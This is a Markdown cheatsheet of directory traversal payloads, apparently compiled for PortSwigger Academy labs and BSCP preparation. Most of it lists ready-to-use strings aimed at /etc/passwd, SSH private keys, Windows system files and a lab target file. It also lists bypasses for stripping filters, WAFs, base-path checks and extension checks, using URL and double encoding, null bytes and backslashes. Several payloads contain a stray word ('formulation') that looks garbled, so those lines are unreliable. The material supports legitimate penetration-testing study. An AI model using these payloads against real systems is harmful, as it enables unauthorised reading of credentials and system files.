# 📁 Directory Traversal / Path Traversal Cheatsheet

Tested methodology, bypass techniques, and payloads compiled during PortSwigger Academy labs and BSCP preparation.
P.s: Little advice, try always put url-encoded payload in target parameters, you can save a lot of time with this trick

---

## 📌 Attack Vectors & Methodology

* Target Parameters: `?file=`, `?filename=`, `?path=`, `?folder=`, `?template=`, `?doc=`, `?view=`
* Key Targets:
  - Linux: `/etc/passwd`, `/etc/issue`, `~/.ssh/id_rsa`, `/home/carlos/secret`
  - Windows: `C:\windows\system32\drivers\etc\hosts`, `C:\boot.ini`

---

## 🛠️ Payloads & Bypass Techniques

### 1. Basic Relative & Absolute Traversal

* Linux / Unix Standard:
  - `../../../etc/passwd`
  - `../../../../etc/passwd`
  - ` formulation/../../../../../etc/passwd`
  - ` formulation/../../ formulation/../../../../etc/passwd`
  - `../../../ formulation/../../../../etc/passwd`

* Target File (PortSwigger Lab Specific):
  - `../../../home/carlos/secret`
  - `../../../../home/carlos/secret`
  - `../../ formulation/../../home/carlos/secret`

* Absolute Path:
  - `/etc/passwd`
  - `/home/carlos/secret`

---

### 2. Bypass Techniques

* Non-Recursive Stripping Bypass:
  (Used when application strips "../" non-recursively)
  - `....//....//....//etc/passwd`
  - `....//....//....//home/carlos/secret`

* Single URL Encoding:
  - `..%2f..%2f..%2fetc%2fpasswd`
  - `..%2f..%2f..%2fhome%2fcarlos%2fsecret`

* Double URL Encoding:
  (Use when WAF or reverse proxy decodes parameters twice)
  - `..%252f..%252f..%252fetc%252fpasswd`
  - `..%252f..%252f..%252fhome%252fcarlos%252fsecret`

* Full Path Encoding (WAF Bypass):
  - `%25%32%66%25%32%65%25%32%65%25%32%66%25%32%65%25%32%65%25%32%66%25%32%65%25%32%65%25%32%66%25%32%65%25%32%65%25%32%66%25%32%65%25%32%65%25%32%66%25%32%65%25%32%65%25%32%66%25%32%65%25%32%65%25%32%66%25%32%65%25%32%65%25%32%66%25%32%65%25%32%65%25%32%66%25%32%65%25%32%65%25%32%66%25%32%65%25%32%65%25%32%66%25%36%38%25%36%66%25%36%64%25%36%35%25%32%66%25%36%33%25%36%31%25%37%32%25%36%63%25%36%66%25%37%33%25%32%66%25%37%33%25%36%35%25%36%33%25%37%32%25%36%35%25%37%34`

* Start Path Validation Bypass:
  (When application validates expected base folder like /var/www/images)
  - `/var/www/images/../../../etc/passwd`
  - `/var/www/images/../../../home/carlos/secret`

* Null Byte Bypass (Legacy Systems / PHP < 5.3.4):
  (Bypasses forced extension check like .png or .jpg)
  - `../../../etc/passwd%00.png`
  - `../../../home/carlos/secret%00.png`

* Windows Backslash Variations:
  - `..\..\..\windows\system32\drivers\etc\hosts`
  - `..\..\..\home\carlos\secret`

---
